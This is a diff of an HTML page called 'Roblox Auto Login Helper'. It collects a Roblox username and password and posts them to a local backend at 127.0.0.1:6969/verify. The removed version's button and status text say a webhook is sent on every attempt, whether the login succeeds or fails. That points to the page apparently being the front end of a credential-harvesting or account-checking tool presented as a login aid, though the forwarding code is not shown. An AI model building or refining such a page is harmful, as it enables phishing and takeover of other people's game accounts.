@@ -1,58 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Roblox Auto Login Helper</title>
-<style>
-body { font-family: Arial; text-align:center; margin-top:50px;}
-input { padding:10px; margin:5px; width:250px;}
-button { padding:10px 20px; margin:5px;}
-#status { margin-top:15px; font-weight:bold; }
-</style>
+    <title>Roblox Auto Login Helper</title>
 </head>
 <body>
-<h2>Roblox Auto Login Helper</h2>
+    <h1>Roblox Auto Login Helper</h1>
 
-<input id="username" placeholder="Username / Email">
-<input id="password" type="password" placeholder="Password">
-<br>
-<button id="loginBtn">Verify Login & Send Webhook</button>
+    <input type="text" id="username" placeholder="Username" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="login()">Login</button>
 
-<p id="status"></p>
+    <p id="status"></p>
 
-<script>
-document.getElementById("loginBtn").addEventListener("click", () => {
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value;
-    const statusEl = document.getElementById("status");
+    <script>
+        async function login() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const statusEl = document.getElementById("status");
 
-    if(!username || !password){
-        statusEl.textContent = "❌ Enter both username and password!";
-        return;
-    }
+            statusEl.innerText = "⏳ Attempting login...";
 
-    statusEl.textContent = "⏳ Attempting login...";
+            try {
+                const response = await fetch("http://127.0.0.1:6969/verify", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password
+                    })
+                });
 
-    fetch("http://127.0.0.1:6969/verify", {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({username, password})
-    })
-    .then(res => res.json())
-    .then(data => {
-        if(data.login === "success"){
-            statusEl.textContent = "✅ Login Successful! Webhook sent.";
-        } else {
-            statusEl.textContent = "❌ Login Failed! Webhook sent.";
+                const data = await response.json();
+
+                if (data.status === "success") {
+                    statusEl.innerText = "✅ Login Successful!";
+                } else if (data.status === "failed") {
+                    statusEl.innerText = "❌ Login Failed!";
+                } else {
+                    statusEl.innerText = "⚠️ Unknown response from backend.";
+                }
+            } catch (err) {
+                statusEl.innerText = "❌ Failed to reach backend!";
+                console.error(err);
+            }
         }
-    })
-    .catch(() => {
-        statusEl.textContent = "❌ Failed to reach backend!";
-    });
-});
-</script>
+    </script>
 </body>
 </html>
-
-
 
